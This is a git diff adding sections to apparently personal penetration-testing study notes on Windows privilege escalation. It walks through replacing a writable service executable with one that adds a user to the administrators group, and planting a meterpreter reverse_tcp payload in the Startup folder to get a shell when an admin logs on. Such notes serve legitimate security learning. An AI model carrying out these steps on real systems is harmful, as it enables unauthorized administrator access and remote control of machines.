@@ -273,6 +273,25 @@ We will place the file to the c:\TEMP folder and will write the next command ---
 Then lets run the command sc start regsvc.
 After we will run the command we will se the the user that we wanted to add is in the administrators group ---> net localgroup adminstrators.
 ``` 
+# Service Escalation Executable Files.
+```
+Lets run the command powershell -ep bypass and then lets run the command ---> . .\powerup.ps1 after we've runned this command we need to run the command ---> Invoke-AllChecks.
+We will see a line that says ---> Checking service executable and arguemnt premissions. we will need to take a look at this.
+We will see a service name that we can abuse to escalate with excutable files, we will look at ModifiableFile, ModifiableFilePremissions, ModifiableFileIdentityReference.
+To exploit the file we need to add our own "script" we can use windows_service.c tool and change the command used by system() function to the command ---> cmd.exe /k net localgroup administrators user /add, and replace the file that exists in the path that we've found.
+After we've replaced the executable file to our custome made one with the milicious code we can run the command ---> sc start $servicename
+```
+# Privilege Escalation with Startup Applications
+```
+When we boot up or machine an application will startup and when this happens we will get a shell.
+We will use the tool icacls.exe to see what privileges we got on the file path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" the command will look lile ---> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup".
+After running the command we will see BUILTIN\Users:<F> that means that we got full premissions to this path (f).
+Now we will generate a malicious file that is executable and we will load it on startup directory and we will wait for an admin user to connect to get a shell on him.
+We can run msfconsole with the command ---> use multi/handler.
+We will set our payload to ---> windows/meterpreter/reverse_tcp and set what we need (we can use msfvenom too).
+After we've created the executable file we will move it to the windows machine and put it in the startup folder.
+After its in the folder we will need to wait until an admin user will logon to the machine and we get a reverse shell.
+```
 # rdesktop connection 
 ```
 rdesktop $IP -g 95% ais an image eky
